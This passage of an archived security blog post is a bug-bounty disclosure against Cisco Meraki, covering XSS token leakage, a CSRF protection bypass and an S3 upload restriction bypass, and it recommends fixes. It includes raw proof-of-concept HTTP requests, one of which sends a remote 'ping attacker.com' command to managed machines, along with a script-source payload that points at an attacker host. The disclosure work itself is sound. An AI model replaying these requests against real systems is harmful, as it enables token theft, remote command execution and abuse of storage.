+Here the victims &amp;authenticity_token [token] and a parameter &amp;_ [current time stamp] is passed on as GET request to the attacker controlled value sas.jpeg. With this bug it’s possible for a remote attacker to steel victims tokens by making the source point to an attacker controlled domain, and steel the tokens. <br />
+<br />
+<img src="attachment8d0d.jpg?attachmentid=613&amp;d=1372752890" border="0" alt="Name:  Screen Shot 2013-07-02 at 1.42.38 PM.jpg
+Views: 1344
+Size:  17.1 KB"  style="float: CONFIG" /><br />
+I was not able to find a filter bypass for http:// [:// ] . This could have been an option [http&amp; # 58 ; &amp; # 4 7 ; &amp; # 4 7 ] but since “ ;” is filtered this does not work. But in older browsers something like this should work &lt;script src=&quot;aa@attacker.com&quot; &gt;. This XSS can be triggered using the below mentioned CSRF protection bypass bug as well by a remote attacker.  I went for help online from <a href="../external.html?link=http://amolnaik4.blogspot.com/" target="_blank">Amol naik</a> and<a href="../external.html?link=http://ironwasp.org/" target="_blank"> Lavakumar Kuppan</a> and had a very good discussion . <br />
+<br />
+Now we have an XSS not quite useful but fun one. I also noticed this small issue that could lead to code execution using the first bug if the admin is using a vulnerable version of flash. The main reason for addressing on such bug is the fact that meraki system manager, that can send shell commands to remote users as well as the Bug 1 were we explained code execution and if there is small chance for CSRF then it would be pretty bad.<br />
+<br />
+<b><u>Bug 4: CSRF Protection Bypass:<br />
+</u></b>Criticality : Medium<br />
+<br />
+Currently the CSRF protection for the application is taken care by two methods, 1) checking Ajax HTTP headers 2) by checking a CSRF token.<br />
+The issue is if either one of the above conditions satisfies in a request then the request is validated.  So even if the authentication_token is removed from a request and added with a X-Requested-With: XMLHttpRequest , the request would be successful. And under certain conditions it is possible to forge an X-requested with header. <br />
+<br />
+<u>Vulnerability:<br />
+</u><br />
+ Under certain conditions the Ajax Http headers could be forged and custom http headers could be added there by defeating the application CSRF protection mechanism. The vulnerability affects meraki users who are running on low version of flash.  Many critical calls in the application depend on Ajax headers for CSRF protection.  So there by crafting a malicious flash page it would be possible to affect meraki users who’s browsers run a lower version of flash. A detailed write up of the bug could be read form here.Ruby on Rails, which is used by meraki has patched the header bypass issue, but the patches require meraki developers to fix their code to always send a CSRF token in Ajax requests. .<br />
+<br />
+<a href="../external.html?link=http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2011-February/007533.html" target="_blank">http://lists.webappsec.org/pipermail...ry/007533.html</a><br />
+<br />
+Using the above issue the following poc exploit was prepared. <br />
+<br />
+<u>POC 1: <br />
+</u><br />
+1) Send reports to attacker controlled email.<br />
+<br />
+POST /Live-Demo-Branch/n/sWS0Fa/manage/reports/email HTTP/1.1<br />
+Host: n1.meraki.com<br />
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:20.0) Gecko/20100101 Firefox/20.0<br />
+Accept: */*<br />
+Accept-Language: en-gb,en;q=0.5<br />
+Accept-Encoding: gzip, deflate<br />
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br />
+X-Requested-With: XMLHttpRequest<br />
+Referer: <a href="../external.html?link=https://n1.meraki.com/Live-Demo-Branch/n/sWS0Fa/manage/reports" target="_blank">https://n1.meraki.com/Live-Demo-Bran...manage/reports</a><br />
+Content-Length: 74<br />
+Cookie: [striped] <br />
+<br />
+email=loverahulsa%40gmail.com<br />
+<br />
+<br />
+<u>POC 2:  CSRF Bypass, Client remote code execution. <br />
+</u><br />
+Meraki system manager,  can send shell commands to remote users. This request ping a machine.<br />
+<br />
+POST /Systems-Manager/n/7iHAgbI/manage/pcc/command HTTP/1.1<br />
+Host: n34.meraki.com<br />
+Connection: keep-alive<br />
+Content-Length: 53<br />
+Accept: */*<br />
+Origin: <a href="../external.html?link=https://n34.meraki.com/" target="_blank">https://n34.meraki.com</a><br />
+X-Requested-With: XMLHttpRequest<br />
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.65 Safari/537.31<br />
+Content-Type: application/x-www-form-urlencoded<br />
+DNT: 1<br />
+Referer: <a href="../external.html?link=https://n34.meraki.com/Systems-Manager/n/7iHAgbI/manage/pcc/command" target="_blank">https://n34.meraki.com/Systems-Manag...ge/pcc/command</a><br />
+Accept-Encoding: gzip,deflate,sdch<br />
+Accept-Language: en-US,en;q=0.8<br />
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3<br />
+Cookie: __cfduid=<br />
+<br />
+machines[]=582090251837638398&amp;command=ping+attacker.com<br />
+<br />
+The machine no in the current request could be bruteforced easily as the machine no 58209025183763[1-2-3-4] is not a random and falls in the same range. So we can make our flash program send request from 582090251837638[000] – 582090251837638[999].  Here remote command is a ping request; the attacker server could be notified by a successful attack by sniffing incoming ICMP packets. <br />
+<br />
+<br />
+<b><u>Fix:<br />
+</u></b><br />
+Having one such critical code execution feature makes it important that the application does not fully depend on a spoof able source like “x-requested-with” headers, even though the chances are very less. Also if a new header-spoofing bug were discovered in java, flash etc, then all of meraki’s products would be vulnerable.  There for it’s highly recommended to relay on access_token or x-request-header and access-token together. <br />
+<br />
+<br />
+<br />
+While understanding and finding a bypass for the above bug XSS bug I noticed few other issues, and I reported those as well to meraki :<br />
+<br />
+<b><u>Bug 5: Malicious file uploading in meraki.<br />
+</u></b><br />
+<br />
+The meraki system manager has got an option to configure a software installer for the clients.[ The module we found XSS on ]<br />
+<u><a href="../external.html?link=https://n34/" target="_blank">https://n34</a>.</u>meraki<u>.com/Systems-Manager/n/Vo6a5cI/manage/pcc/installer</u><br />
+<br />
+Based on the docunmentation  here. <br />
+<br />
+<u><a href="../external.html?link=https://docs/" target="_blank">https://docs</a>.</u>meraki<u>.com/display/SM/Configure+%3E+Software+installer</u><br />
+<br />
+&quot;<br />
+Please keep in mind that you will only be able to deploy .msi files to Windows machines and .pkg files to Mac OS machines.<br />
+The software management tool will only allow one type of file to be uploaded at once.<br />
+&quot;<br />
+It seems like the application is made to only accept .msi and .pkg files to be uploded . And also only one type at a time.<br />
+<br />
+<br />
+But it was possible to bypass these restrictions to perform the following actions.<br />
+<br />
+1) Upload files with any file extension to Meraki amazon s3.<br />
+2) Upload file to a different path than the root path.<br />
+3) Upload any number of files to Meraki S3 account , and use Meraki s3 as a personal file sharing server.<br />
+<br />
+Based on our analysis , an opensource ruby on rails project [carrierwave direct ] was used on &quot;/Systems-Manager/n/Vo6a5cI/manage/pcc/installer&quot; page.<br />
+<br />
+Project: <u><a href="../external.html?link=https://github.com/dwilkie/carrierwave_direct" target="_blank">https://github.com/dwilkie/carrierwave_direct</a></u><br />
+<br />
+The current version of the carrierwave direct code powering meraki is outdated .<br />
+<br />
+<br />
+<br />
+1) Upload files with any file extension to Meraki amazon s3.<br />
+<br />
+It is possible to alter the fileupload post request to meraki<u>-pcc-installers.s3.amazonaws.com</u> and alter the file name<br />
+to any extension of attackers choice. Only validation is done at client side and no server side validation is performed.<br />
+<br />
+Sample Request:<br />
+<br />
+POST /sas HTTP/1.1<br />
+Host: meraki<u>-pcc-installers.s3.amazonaws.com</u><br />
+<br />
+------------GI3gL6ei4Ef1Ij5Ij5Ef1ae0ei4ei4<br />
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;sas.mp3&quot;<br />
+Content-Type: application/octet-stream<br />
+<br />
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;<br />
+&lt;!DOCTYPE cross-domain-policy SYSTEM<br />
+<br />
+<br />
+Recreating the POC:<br />
+<br />
+Rename an Mp3 file to msi, upload the file and tamper the request and modify the file name to .mp3 extension. <br />
+The application will upload the posted file and write to the dom that a msi file was uploded, but in reality the file uploded<br />
+would be an mp3 file.<br />
+<br />
+Poc uploaded mp3 song :<br />
+<br />
+<u>http://</u>meraki<u>-pcc-installers.s3.amazonaws.com/475c5df1536ecdc194b7b4b630756242e450e201/nejukullae.mp3</u><br />
+<br />
+<br />
+<br />
+2) Upload Multiple Files to Meraki S3 account.<br />
+<br />
+It's possible to use meraki account as a personal file sharing space.<br />
+<br />
+Poc Files: <br />
+<br />
+<u>http://</u>meraki<u>-pcc-installers.s3.amazonaws.com/475c5df1536ecdc194b7b4b630756242e450e201%2Ftest.pk  g</u><br />
+<u>http://</u>meraki<u>-pcc-installers.s3.amazonaws.com/475c5df1536ecdc194b7b4b630756242e450e201%2Ftest.jp  eg</u><br />
+<u>http://</u>meraki<u>-pcc-installers.s3.amazonaws.com/475c5df1536ecdc194b7b4b630756242e450e201%2Ftest.ex  e</u><br />
+<br />
+<br />
+3) Upload files to a different path than the upload root path.<br />
+<br />
+The upload code relies on the  form-data key value to set the upload path, and that value is used with out filtering.<br />
+<br />
+POST /sas HTTP/1.1<br />
+Host: meraki<u>-pcc-installers.s3.amazonaws.com</u><br />
+<br />
+<br />
+------------GI3gL6ei4Ef1Ij5Ij5Ef1ae0ei4ei4<br />
+Content-Disposition: form-data; name=&quot;key&quot;<br />
+<br />
+475c5df1536ecdc194b7b4b630756242e450e201/${filename}<br />
+<br />
+<br />
+<br />
+If we modify it to<br />
+<br />
+------------GI3gL6ei4Ef1Ij5Ij5Ef1ae0ei4ei4<br />
+Content-Disposition: form-data; name=&quot;key&quot;<br />
+<br />
+475c5df1536ecdc194b7b4b630756242e450e201.txt<br />
+<br />
+<br />
+Then an attacker can create a file on the server root path.<br />
+<br />
+POC file created:<br />
+<br />
+<u>http://</u>meraki<u>-pcc-installers.s3.amazonaws.com/475c5df1536ecdc194b7b4b630756242e450e201.txt</u><br />
+<br />
+<br />
+Same way an existing file could be replaced with a malicious file as well. For example uploded chrome installer<br />
+<br />
+/key/chrome.exe could be replaced with a malicious exe , if a second post request is made using the same name.<br />
+<br />
+<br />
+<br />
+<u>Consequences of the above exploits.<br />
+</u><br />
+1) A user can upload an malicious exe file and get it flagged by Amazon S3 or other URL monitors and get meraki<u>-pcc-installers.s3.amazonaws.com</u><br />
+account blocked or the domain blacklisted. Malware developers can use Meraki account as a malware controller. <br />
+<br />
+2) A user can use meraki s3 account as his/her personal file sharing space. I have already reported about creating multiple<br />
+user accounts using a single [gmail]email id in my previous report. That technique can be used to create n no of accounts.<br />
+<br />
+3) Even though the open source code carrierwave_direct has got a file extension whitelisting and and file size limit,<br />
+<u><a href="../external.html?link=https://github.com/dwilkie/carrierwave_direct/blob/master/spec/orm/activerecord_spec.rb" target="_blank">https://github.com/dwilkie/carrierwa...record_spec.rb</a></u><br />
+<br />
+I don't find it configured properly on meraki.<br />
+<br />
+4) Unlimited file hosting for the attacker . <br />
+<br />
+<br />
+<b><u>Fix:<br />
+</u></b><br />
+Update meraki to the latest version of carrierwave_direct<br />
+<br />
+Filter all user controlled input for file name creation, set max|min file uploading size, set file extension whitelist. <br />
+<br />
+<u><b>Miscellaneous aka Pointless:<br />
+</b></u> <br />
+This section contains few observations that cannot be either classified as a security bug or that a poc exploit was not producible. I found worth mentioning it on the report so this was also included in my reports to cisco. <br />
+<br />
+<b><u>Observation 1:  <br />
+</u></b><br />
+It is possible to create multiple accounts under same email. This under certain scenarios could be dangerous.<br />
+<br />
+<a href="../external.html?link=https://account.meraki.com/login/new_account" target="_blank">https://account.meraki.com/login/new_account</a><br />
+<br />
+The application treats <br />
+<br />
+<a href="mailto:fb1h2s@gmail.com">fb1h2s@gmail.com</a> and <a href="mailto:fb1h2.s@gmail.com">fb1h2.s@gmail.com</a> to be two different id’s but gmail treats both the ids to be same. So n no of registrations can be made using a single email id.  This could be fixed if necessary.<br />
+ <br />
+<br />
+Any way I had a productive weekend and some easy CASH[$$$] , so this bug hunting was fun profitable <img src="images/smilies/wink.html" border="0" alt="" title="Wink" class="inlineimg" />. Let me see when I can find time for more bounties. <br />
+<br />
+Regards,<br />
+<u><b>Rahul Sasi<br />
+</b></u><a href="../external.html?link=http://in.linkedin.com/pub/rahul-sasi-fb1h2s/15/112/b91/" target="_blank">http://in.linkedin.com/pub/rahul-sas...2s/15/112/b91/</a>
+
+					
+				</blockquote>
+			</div>
+				
+
+
+				<div class="blogcontrol fly">
+					
+				</div>
+
+				<div class="blogmeta">
+					
+
+					
+					<div class="tags" id="blogtagcontainer_1044">
+							Tags:
+							<span id="blogtaglist_1044">
+								
+								<a href="blog980d.html?u=8&amp;tag=bug+bounty">bug bounty</a>, 
+	
+
+	
+		<a href="blog2833.html?u=8&amp;tag=cisco+hacking">cisco hacking</a>, 
+	
+
+	
+		<a href="blog8b1d.html?u=8&amp;tag=meraki">meraki</a>, 
+	
+
+	
+		<a href="blogccb6.html?u=8&amp;tag=rahul+sasi">rahul sasi</a>
+								
+							</span>
+							
+								<span id="blogtagmenu_1044"><a href="threadtag0740.html?do=manage&amp;contenttype=vBBlog_BlogEntry&amp;contentid=1044"><img src="images/misc/blog/tag_edit.html" border="0" class="inlineimg" id="blogtag_1044" alt="Add / Edit Tags" /></a></span>
+							
+					</div>
+					
+				
+					
+					<dl class="blogcategory stats">
+						<dt class="shade">Categories</dt>
+						<dd>
+
+	
+		<a href="blog71e7.html?u=8&amp;blogcategoryid=-1">Uncategorized</a>
+	
+</dd>
+					</dl>
+					
+				</div>
+				<ul class="entrycontrols">
+					
+					
+					
+					
+					
+				</ul>
+
+		</div>
+	</div>
+
+</div>
+
+<div id="navlinks">
+	<!-- top navlinks -->
+	
+		&laquo; <a href="blog94ae.html?b=1044&amp;goto=prev">Prev</a>
+		&nbsp;&nbsp;&nbsp;
+	
+	<a href="bloge81f.html?u=8">Main</a>
+		
+			&nbsp;&nbsp;&nbsp;
+			<a href="blog771b.html?b=1044&amp;goto=next">Next</a> &raquo;
+		
+	<!-- end top navlinks -->
+</div>
+
+
+
+
+<!-- lightbox scripts -->
+	<script type="text/javascript" src="clientscript/vbulletin_lightbox6719.html?v=421"></script>
+	<script type="text/javascript">
+	<!--
+	vBulletin.register_control("vB_Lightbox_Container", "entry1044", 1);
+	//-->
+	</script>
+<!-- / lightbox scripts -->
+
+
+
+
+<h2 id="comments_heading" class="commentsheader"><a name="comments"></a>Comments</h2>
+
+<div id="above_comments" class="floatcontainer">
+	
+	
+		
+</div>
+
+<form action="../external.html?link=http://garage4hackers.com/blog_inlinemod.php?b=1044" method="post" id="commentform" class="block">
+	
+
+	<div id="below_comments" class="floatcontainer">
+		
+	</div>
+
+	<input type="hidden" name="s" value="" />
+	<input type="hidden" name="securitytoken" value="guest" />
+	<input type="hidden" name="b" value="1044" />
+	<input type="hidden" name="bt" value="" />
+	<input type="hidden" name="url" value="" />
+	<input type="hidden" name="userid" value="8" />
+</form>
+
+
+
+
+
+
+
+
+	
+		<!-- Editor Scripts -->
+<script type="text/javascript">
+<!--
+
+var CKEDITOR_BASEPATH = getBaseUrl() + 'clientscript/ckeditor/';
+
+var ltr = 'left';
+
+
+
+var ignorequotechars = 1;
+var allowbasicbbcode = false;
+
+// vB Phrases
+vbphrase["must_enter_subject"]           = "You must enter a title / subject!";
+vbphrase["message_too_short"]            = "The message you have entered is too short. Please lengthen your message to at least %1$s characters.";
+vbphrase["click_quick_reply_icon"]       = "";
+vbphrase["all_files"]                    = "All Files";
+vbphrase["file_is_too_large"]            = "File is too Large";
+vbphrase["invalid_file"]                 = "Invalid File";
+vbphrase["maximum_number_of_attachments_reached"] = "Maximum number of attachments reached";
+
+//-->
+</script>
+<!-- / Editor Scripts -->
+		<script type="text/javascript" src="clientscript/ckeditor/ckeditor14ad.html?t=A7HG4HT&amp;v=421"></script><script type="text/javascript" src="clientscript/vbulletin_textedit6719.html?v=421"></script>
+	
+<div id="ajax_post_errors" class="hidden">
+	<div class="block">
+		<div class="blockhead floatcontainer">
+			<span class="blockhead_info"><input type="button" class="button" value=" X " id="quick_edit_errors_hide" /></span>
+			<h2>vBulletin Message</h2>
+		</div>
+		<div class="blockbody">
+			<div id="ajax_post_errors_message" class="blockrow">&nbsp;</div>
+		</div>
+		<div class="blockfoot">
+			<a href="#" id="quick_edit_errors_cancel" class="textcontrol">Cancel Changes</a>
+		</div>
+	</div>
+</div>
+	<script type="text/javascript" src="clientscript/blog_quick_edit6719.html?v=421"></script>
+	
+
+
+
+
+	
+
+	<h2 id="trackbacks_heading" class="commentsheader"><a name="trackbacks"></a>Trackbacks</h2>
+
+	<div class="trackbacks_block">
+		<span class="shade">Total Trackbacks</span> 0
+	
+		<div class="shade">
+			<a href="entry8161.html?b=1044" title="Trackback URL" class="shade">No other blogs currently reference this blog entry</a>
+		</div>
+	
+
+		
+		
+		<div id="trackbackurl">
+			Trackback URL: <input type="text" value="http://garage4hackers.com/blog_callback.php?b=1044" onmouseover="this.select();" />
+		</div>
+		
+	</div>
+
+	
+
+
+<script type="text/javascript">
+<!--
+	vBulletin.register_control("vB_QuickEdit_Blog_Entry", "1044");
+    extra = {
+    //
+    };
+
+    extra.userid = "8";
+
+    vBulletin.register_control("vB_AJAX_TagEditor", "vBBlog_BlogEntry", "1044", "blog", extra);
+//-->
+</script>
+<script type="text/javascript" src="clientscript/vbulletin_menu6719.html?v=421"></script>
+<script type="text/javascript" src="clientscript/vbulletin_ajax_tageditor6719.html?v=421"></script>
+			<!-- End main content -->
+		        </div>
+		</div>
+	</div>
+	<div id="sidebar_container"><h6 class="actionbutton_container">
+	
+		<a class="pagetitleinfo textcontrol" href="register.html" rel="nofollow"><span>+</span> Create Blog</a>
+	
+	</h6>
+
+<div id="blog_user_sidebar">
+	
+
+	<div class="block mainblock">
+		<div class="blocksubhead"><a class="username offline" href="membere81f.html?u=8">fb1h2s</a></div>
+		<div id="userinfoblock" class="floatcontainer">
+			
+			<a class="avatar" href="membere81f.html?u=8" title="fb1h2s's Avatar">
+				<span class="avatarcontainer"><img src="meb1c6.jpg?u=8&amp;dateline=1397117991&amp;type=profile" alt="fb1h2s's Avatar" /></span>
+			</a>
+			
+				
+			<ul class="list_no_decoration" id="usermenu">
+				
+					<li>
+						<a href="membere81f.html?u=8"><img src="images/site_icons/profile.html" alt="Go to Profile" /> Go to Profile</a>
+					</li>
+				
+				
+				
+
+				
+				
+				<li>
+					<a href="blog4af1.html?u=8&amp;do=markread&amp;readhash=" rel="nofollow"><img src="images/site_icons/markasread.html" alt="Mark as Read" /> Mark as Read</a>
+				</li>
+				
+				
+			</ul>
+		</div>
+
+		<div class="blockbody">
+			<div class="blockrow">
+				<div id="userstats">
+					
+					<dl class="stats">
+						<dt>Join Date</dt>
+						<dd>Jul 2010</dd>
+					</dl>
+					
+					
+					<dl class="stats">
+						<dt>Location</dt>
+						<dd>India</dd>
+					</dl>
+					
+					
+					<dl class="stats">
+						<dt>Posts</dt>
+						<dd>616</dd>
+					</dl>
+					<dl class="stats">
+						<dt>Blog Entries</dt>
+						<dd>32</dd>
+					</dl>
+					
+					
+					
+					
+					
+				</div>
+
+				
+			</div>		
+		</div>
+	</div>
+	<div class="underblock"></div>
+
+	
+
+	
+
+	
+
+	<ul id="moveable_blocks">
+		
+		
+		
+		
+		
+		
+		
+		
+	<li id="block_entries">
+		<div class="block smaller moveable" id="block_entries_div">
+			<div class="blocksubhead"  id="block_entries_handle">
+				<a href="#top" id="collapse_c_blog_entries" class="collapse"><img id="collapseimg_blog_entries" src="images/buttons/collapse_40b.png" alt="" /></a>
+				<a href="bloge81f.html?u=8">Recent Blog Posts</a>
+			</div>
+			<div class="blockbody" id="c_blog_entries">
+				<ul class="blockrow">
+					<li class="avatarcontent floatcontainer">
+	<a class="smallavatar">
+		
+		<img width="30" alt="" src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" title=""/>
+		
+	</a>
+	<div class="smallavatartext">
+		
+		<a href="entry1698.html?b=3105">Maldrone the First Backdoor for drones.</a>
+		
+		<br />
+		
+		01-26-2015 <span class="time">09:26 PM</span>
+	</div>
+</li><li class="avatarcontent floatcontainer">
+	<a class="smallavatar">
+		
+		<img width="30" alt="" src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" title=""/>
+		
+	</a>
+	<div class="smallavatartext">
+		
+		<a href="entry5930.html?b=3103">Cracking a Captcha . Nullcon| EMC2 CTF 2015</a>
+		
+		<br />
+		
+		01-15-2015 <span class="time">05:01 PM</span>
+	</div>
+</li><li class="avatarcontent floatcontainer">
+	<a class="smallavatar">
+		
+		<img width="30" alt="" src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" title=""/>
+		
+	</a>
+	<div class="smallavatartext">
+		
+		<a href="entrye3ad.html?b=3098">Pentesting a DVB-C network .Hacking your cable TV Network Part 1</a>
+		
+		<br />
+		
+		12-27-2014 <span class="time">07:23 PM</span>
+	</div>
+</li><li class="avatarcontent floatcontainer">
+	<a class="smallavatar">
+		
+		<img width="30" alt="" src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" title=""/>
+		
+	</a>
+	<div class="smallavatartext">
+		
+		<a href="entry94bc.html?b=3087">Everything you need to know about CVE-2014-6271</a>
+		
+		<br />
+		
+		09-25-2014 <span class="time">05:45 AM</span>
+	</div>
+</li><li class="avatarcontent floatcontainer">
+	<a class="smallavatar">
+		
+		<img width="30" alt="" src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" title=""/>
+		
+	</a>
+	<div class="smallavatartext">
+		
+		<a href="entryf50f.html?b=3073">Low hanging Web Application bugs in Digital Cable :Hacking Cable TV Networks Part 1</a>
+		
+		<br />
+		
+		08-06-2014 <span class="time">03:30 AM</span>
+	</div>
+</li>
+				</ul>
+			</div>
+		</div>
+		<div class="underblock"></div>
+	</li>
+
+	<li id="block_comments">
+		<div class="block smaller moveable" id="block_comments_div">
+			<div class="blocksubhead"  id="block_comments_handle">
+				<a href="#top" id="collapse_c_blog_comments" class="collapse"><img src="images/buttons/collapse_40b.png" alt="" /></a>
+				<a href="bloge2b6.html?u=8&amp;do=comments">Recent Comments</a>
+			</div>
+			<div class="blockbody" id="c_blog_comments">
+				<ul class="blockrow">
+					<li class="avatarcontent floatcontainer">
+	<a class="smallavatar">
+		
+		<img width="30" alt="" src="images/misc/unknown.html" title=""/>
+		
+	</a>
+	<div class="smallavatartext">
+		
+		
+		<a href="entryb3ce.html?b=3105&amp;bt=3227#comment3227">Maldrone the First Backdoor for drones.</a>
+
+		<br />
+
+		
+		<span class="shade">by <a href="member47d6.html?u=25275" rel="nofollow" class="shade">leeladitya</a></span>
+		
+	</div>
+</li><li class="avatarcontent floatcontainer">
+	<a class="smallavatar">
+		
+		<img width="30" alt="" src="images/misc/unknown.html" title=""/>
+		
+	</a>
+	<div class="smallavatartext">
+		
+		
+		<a href="entrye119.html?b=3087&amp;bt=3182#comment3182">Everything you need to know about CVE-2014-6271</a>
+
+		<br />
+
+		
+		<span class="shade">by <a href="member93c5.html?u=21" rel="nofollow" class="shade">neo</a></span>
+		
+	</div>
+</li><li class="avatarcontent floatcontainer">
+	<a class="smallavatar">
+		
+		<img width="30" alt="" src="images/misc/unknown.html" title=""/>
+		
+	</a>
+	<div class="smallavatartext">
+		
+		
+		<a href="entryc255.html?b=392&amp;bt=3175#comment3175">Hacking RFID Acces Door .  Personal Diary #Non-Technical.</a>
+
+		<br />
+
+		
+		<span class="shade">by <a href="memberf7ab.html?u=20549" rel="nofollow" class="shade">cipher</a></span>
+		
+	</div>
+</li><li class="avatarcontent floatcontainer">
+	<a class="smallavatar">
+		
+		<img width="30" alt="" src="sss836c.png?u=238&amp;dateline=1333021046&amp;type=thumb" title=""/>
+		
+	</a>
+	<div class="smallavatartext">
+		
+		
+		<a href="entryc62b.html?b=3069&amp;bt=3155#comment3155">How the Internet Bug bounty Killed an Exploit Kit.</a>
+
+		<br />
+
+		
+		<span class="shade">by <a href="member5665.html?u=238" rel="nofollow" class="shade">[s]</a></span>
+		
+	</div>
+</li><li class="avatarcontent floatcontainer">
+	<a class="smallavatar">
+		
+		<img width="30" alt="" src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" title=""/>
+		
+	</a>
+	<div class="smallavatartext">
+		
+		
+		<a href="entry3e65.html?b=785&amp;bt=871#comment871">DEP ASLR bypass without ROP JIT : CanSecWest2013 Slides and Analysis</a>
+
+		<br />
+
+		
+		<span class="shade">by <a href="membere81f.html?u=8" rel="nofollow" class="shade">fb1h2s</a></span>
+		
+	</div>
+</li>
+				</ul>
+			</div>
+		</div>
+		<div class="underblock"></div>
+	</li>
+<li id="block_archive">
+	<div class="block blogusermenu" id="vb_blogcalendar">
+		<div id="block_archive_div" class="calendar mini">
+	<h4 class="blocksubhead smaller moveable" id="block_archive_handle">
+		<a href="#top" id="collapse_c_blog_calendar" class="collapse"><img src="images/buttons/collapse_40b.png" alt="" /></a>
+		Archive
+	</h4>
+	<div class="blockbody" id="c_blog_calendar">
+		<table width="100%" class="blockrow">
+			<tr>
+				
+					<th class="blocksubhead" align="center" id="vb_blogcalendar_prevmonth" prevmonth="1" prevyear="2015">
+						&nbsp;
+						
+							<a href="blogb903.html?u=8&amp;m=1&amp;y=2015">&lt;</a>
+						
+						&nbsp;
+					</th>
+									
+				<th class="blocksubhead" colspan="5" align="center" id="vb_blogcalendar_currentmonth">
+					
+						<a href="blog9b8e.html?u=8&amp;m=3&amp;y=2020">March 2020</a>
+					
+				</th>
+				
+					<th class="blocksubhead">
+						&nbsp;&nbsp;&nbsp;
+					</th>
+ 				
+         		</tr>
+			<tr align="center">
+				<td class="blogsubheader">Su</td>
+				<td class="blogsubheader">Mo</td>
+				<td class="blogsubheader">Tu</td>
+				<td class="blogsubheader">We</td>
+				<td class="blogsubheader">Th</td>
+				<td class="blogsubheader">Fr</td>
+				<td class="blogsubheader">Sa</td>
+			</tr>
+			<tr><td class="othermonth">
+	
+		<span class="simpleday">23</span>
+	
+</td><td class="othermonth">
+	
+		<span class="simpleday">24</span>
+	
+</td><td class="othermonth">
+	
+		<span class="simpleday">25</span>
+	
+</td><td class="othermonth">
+	
+		<span class="simpleday">26</span>
+	
+</td><td class="othermonth">
+	
+		<span class="simpleday">27</span>
+	
+</td><td class="othermonth">
+	
+		<span class="simpleday">28</span>
+	
+</td><td class="othermonth">
+	
+		<span class="simpleday">29</span>
+	
+</td></tr><tr><td>
+	
+		<span class="simpleday">1</span>
+	
+</td><td>
+	
+		<span class="simpleday">2</span>
+	
+</td><td>
+	
+		<span class="simpleday">3</span>
+	
+</td><td>
+	
+		<span class="simpleday">4</span>
+	
+</td><td>
+	
+		<span class="simpleday">5</span>
+	
+</td><td>
+	
+		<span class="simpleday">6</span>
+	
+</td><td>
+	
+		<span class="simpleday">7</span>
+	
+</td></tr><tr><td>
+	
+		<span class="simpleday">8</span>
+	
+</td><td>
+	
+		<span class="simpleday">9</span>
+	
+</td><td>
+	
+		<span class="simpleday">10</span>
+	
+</td><td>
+	
+		<span class="simpleday">11</span>
+	
+</td><td>
+	
+		<span class="simpleday">12</span>
+	
+</td><td>
+	
+		<span class="simpleday">13</span>
+	
+</td><td>
+	
+		<span class="simpleday">14</span>
+	
+</td></tr><tr><td>
+	
+		<span class="simpleday">15</span>
+	
+</td><td>
+	
+		<span class="simpleday">16</span>
+	
+</td><td>
+	
+		<span class="simpleday">17</span>
+	
+</td><td>
+	
+		<span class="simpleday">18</span>
+	
+</td><td>
+	
+		<span class="simpleday">19</span>
+	
+</td><td>
+	
+		<span class="simpleday">20</span>
+	
+</td><td>
+	
+		<span class="simpleday">21</span>
+	
+</td></tr><tr><td class="today" title="Today">
+	
+		<span class="simpleday">22</span>
+	
+</td><td>
+	
+		<span class="simpleday">23</span>
+	
+</td><td>
+	
+		<span class="simpleday">24</span>
+	
+</td><td>
+	
+		<span class="simpleday">25</span>
+	
+</td><td>
+	
+		<span class="simpleday">26</span>
+	
+</td><td>
+	
+		<span class="simpleday">27</span>
+	
+</td><td>
+	
+		<span class="simpleday">28</span>
+	
+</td></tr><tr><td>
+	
+		<span class="simpleday">29</span>
+	
+</td><td>
+	
+		<span class="simpleday">30</span>
+	
+</td><td>
+	
+		<span class="simpleday">31</span>
+	
+</td><td class="othermonth">
+	
+		<span class="simpleday">1</span>
+	
+</td><td class="othermonth">
+	
+		<span class="simpleday">2</span>
+	
+</td><td class="othermonth">
+	
+		<span class="simpleday">3</span>
+	
+</td><td class="othermonth">
+	
+		<span class="simpleday">4</span>
+	
+</td></tr>
+		</table>
+	</div>
+</div>
+	</div>
+	<div class="underblock"></div>
+	<script type="text/javascript" src="clientscript/blog_ajax_calendar6719.js?v=421"></script>
+	<script type="text/javascript">
+	<!--
+		blogCalendar = new vB_AJAX_BlogCalendar('blogCalendar', 'vb_blogcalendar', 3, 2020, 8);
+	//-->
+	</script>
+</li>
+<li id="block_visitors">
+	<div class="block" id="block_visitors_div">
+		<div class="blocksubhead" id="block_visitors_handle">
+			<a href="#top" id="collapse_c_blog_visitors" class="collapse"><img id="collapseimg_blog_visitors" src="images/buttons/collapse_40b.png" alt="" border="0" /></a>
+			Recent Visitors
+		</div>
+		<div class="blockbody" id="c_blog_visitors">
+			<div class="blockrow">
+				<ul id="recent_visitors_list" class="commalist">
+					
+						<li><a class="username" href="member1e56.html?u=26373">andymarcus</a>, </li>
+					
+						<li><a class="username" href="member3406.html?u=26190">em616</a>, </li>
+					
+						<li><a class="username" href="member8eb6.html?u=26085">Kabalu</a>, </li>
+					
+						<li><a class="username" href="member47d6.html?u=25275">leeladitya</a>, </li>
+					
+						<li><a class="username" href="memberfeac.html?u=25980">nitmalviya03</a>, </li>
+					
+						<li><a class="username" href="memberdb7f.html?u=25940">noor46968</a>, </li>
+					
+						<li><a class="username" href="member0297.html?u=26164">shadowfox</a>, </li>
+					
+						<li><a class="username" href="member9e83.html?u=25329">stnlrgrs</a>, </li>
+					
+						<li><a class="username" href="member2ab6.html?u=26103">tannyl</a>, </li>
+					
+						<li><a class="username" href="memberb428.html?u=25907">Test12</a></li>
+					
